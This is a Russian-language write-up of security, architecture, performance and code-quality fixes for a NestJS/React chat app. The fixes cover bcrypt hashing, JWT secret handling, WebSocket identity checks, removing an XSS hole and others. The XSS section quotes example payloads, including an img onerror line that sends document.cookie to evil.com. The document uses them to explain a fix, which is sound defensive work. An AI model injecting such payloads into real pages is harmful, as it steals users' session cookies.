# GoTech Chat — Fix Write-up

## Security Fixes

### `MD5` → `bcrypt` для хеширования паролей (auth.service.ts)

MD5 — криптографически сломан для хранения паролей: не использует соль, существуют готовые rainbow tables на миллиарды MD5 хешей, современный GPU перебирает миллиарды MD5 в секунду. Заменил на bcrypt который специально разработан для паролей: автоматически генерирует уникальную соль для каждого хеша и настраиваемо замедлен (cost factor 10 = ~100ms на хеш). Также исправил логику login — старый код сравнивал хеши в SQL (WHERE password = md5(input)), с bcrypt это невозможно так как одинаковые пароли дают разные хеши. Теперь находим пользователя по username, затем bcrypt.compare().

---

### Захардкоженный `JWT secret` (auth.service.ts, chat.controller.ts)

'supersecret' присутствовал в двух файлах и попадал в git историю навсегда. Любой с доступом к репозиторию мог подписывать произвольные JWT токены. Перенёс в process.env.JWT_SECRET с явным падением при старте если переменная не задана — лучше крэш при деплое чем тихая работа с небезопасным секретом.

---

### `WebSocket` доверял `userId` от клиента (chat.gateway.ts)

handleMessage принимал { roomId, userId, content, senderName } и слепо использовал клиентский userId при сохранении сообщения. Любой мог отправить чужой userId и писать от чужого имени. Исправил: при подключении верифицируем JWT токен из handshake.auth, сохраняем userId и username в client.data — серверное хранилище Socket.IO недоступное клиенту. В хендлерах берём данные только оттуда.

---

### `GET /users` возвращал хеши паролей (app.controller.ts)

Эндпоинт делал userRepository.find() без фильтрации полей — возвращал поле password всем авторизованным пользователям. Дополнительно контроллер обращался к приватному репозиторию через chatService['userRepository'], ломая инкапсуляцию. Создал UsersService.findAll() с явным select: ['id', 'username'] — поле password теперь никогда не покидает сервер.

---

### `XSS` через `dangerouslySetInnerHTML` (MessageItem.tsx)

Контент сообщений рендерился через dangerouslySetInnerHTML={{ __html: message.content }} без какой-либо санитизации. Любой пользователь мог отправить <script>alert(document.cookie)</script> или <img src=x onerror="fetch('evil.com?c='+document.cookie)"> и выполнить произвольный JS в браузере других пользователей. Заменил на обычный текстовый рендеринг {message.content} — React автоматически экранирует все спецсимволы.

## Architecture Fixes

### `Feature` модули (app.module.ts)

Все сервисы, контроллеры и entity были зарегистрированы в одном AppModule. Разбил на три независимых модуля: AuthModule (регистрация, логин, верификация токенов), ChatModule (комнаты, сообщения, WebSocket), UsersModule (данные пользователей). Каждый модуль инкапсулирует свои зависимости, экспортирует только то что нужно другим модулям.

---

### `Бизнес-логика` из контроллера в `DTO` (app.controller.ts)

Валидация username.length < 3 жила прямо в контроллере. Создал RegisterDto и LoginDto с декораторами class-validator, подключил глобальный ValidationPipe в main.ts с whitelist: true и forbidNonWhitelisted: true. Теперь невалидные данные отклоняются автоматически с корректным HTTP 400.

---

### `Prop drilling` устранён через `Context` (фронтенд)

token, socket, apiUrl передавались по цепочке ChatPage → RoomList → MessageItem хотя RoomList и MessageItem их не использовали — только передавали дальше. Создал ChatContext и useChat() хук. Компоненты которым нужны эти значения получают их напрямую из контекста.

## Performance Fixes

### `N+1` запросы (chat.service.ts)

getMessages() делал findOne() для каждого сообщения в цикле чтобы получить username — 100 сообщений = 101 запрос к БД. Заменил на relations: ['user'] в TypeORM find — один JOIN запрос возвращает всё сразу. Для этого добавил @ManyToOne relation в Message entity.

---

### Индексы на `FK` колонках (message.entity.ts, user.entity.ts)

messages.room_id и messages.user_id используются в каждом WHERE запросе но индексов не было — full table scan при каждом открытии комнаты. Добавил @Index() на roomId, userId в Message и на username в User (используется при каждом логине).

---

### Пагинация сообщений (chat.controller.ts, chat.service.ts)

getMessages() возвращал все сообщения комнаты без ограничений. Добавил query параметры limit (default 50) и offset (default 0), передаём в TypeORM через take/skip.

---

### `Socket` пересоздавался на каждый рендер (App.tsx)

const socket = io(...) был в теле компонента — при каждом ре-рендере App создавалось новое WebSocket соединение, старое не закрывалось. Перенёс в useRef — создаётся один раз, переиспользуется между рендерами, закрывается в cleanup useEffect.

---

### Полный `refetch` вместо `append` (ChatPage.tsx)

На каждый WebSocket ивент newMessage вызывался fetchMessages() — полный REST запрос всех сообщений комнаты. При активном чате это означало постоянные лишние запросы. Заменил на setMessages(prev => [...prev, message]) — просто добавляем одно новое сообщение в конец массива.

## Code Quality Fixes

### `Class component` → функциональный (Header.tsx)

Header был единственным class component в проекте. Переписал на функциональный с устранением внутреннего state: { status: number } — isConnected: boolean уже передаётся как prop, дублировать его в локальном state не нужно.

---

### `Magic numbers` в `Header` (Header.class.tsx)

status: 1 означало "disconnected", status: 2 — "connected". Нигде не задокументировано, понять можно только читая componentDidUpdate. Устранено вместе с переходом на функциональный компонент — используем isConnected: boolean напрямую.

---

### `Hardcoded URL` в 4 местах

**http://localhost:3000** дублировался в App.tsx, LoginPage.tsx, RegisterPage.tsx, ChatPage.tsx. Вынес в constants.ts с чтением из import.meta.env.VITE_API_URL — легко менять между окружениями через .env.

---

### `key={index}` в списках

messages.map((msg, index) => <MessageItem key={index} ...>) и аналогично в RoomList. Индекс как key ломает React reconciliation при изменении порядка элементов — компоненты переиспользуются с чужим state. Заменил на key={msg.id} и key={room.id}.

---

### `any` типы везде

useState<any[]> для rooms и messages, body: any в контроллерах, data: any в gateway. Заменил на явные интерфейсы везде. Включил noImplicitAny: true в tsconfig.json бэкенда и strict: true на фронтенде чтобы компилятор ловил такие места автоматически.

---

### `console.log` в продакшн путях

Удалил console.log из register, login, handleConnection, handleJoinRoom — логирование имён пользователей и внутренних событий в проде это утечка информации и мусор в логах.

---

### Закомментированный мёртвый код

Удалил закомментированный bcrypt импорт в auth.service.ts, незаконченные методы getActiveUsers() и deleteMessage() в chat.service.ts (авторизация в deleteMessage была закомментирована), неиспользуемые DTO в src/dto/.
